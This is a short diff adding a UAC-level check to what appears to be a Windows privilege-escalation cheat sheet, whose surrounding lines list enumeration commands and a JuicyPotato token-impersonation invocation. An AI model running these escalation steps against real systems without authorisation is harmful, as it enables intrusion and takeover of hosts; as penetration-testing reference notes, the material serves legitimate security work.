@@ -893,6 +893,9 @@ python3 exploit.py
 whoami
 net user {USERNAME}
 
+# Check UAC level
+whoami /groups
+
 # Check Privledges for Impersonation
 whoami /priv
 JuicyPotato.exe -t * -p {run.exe} -l 8003
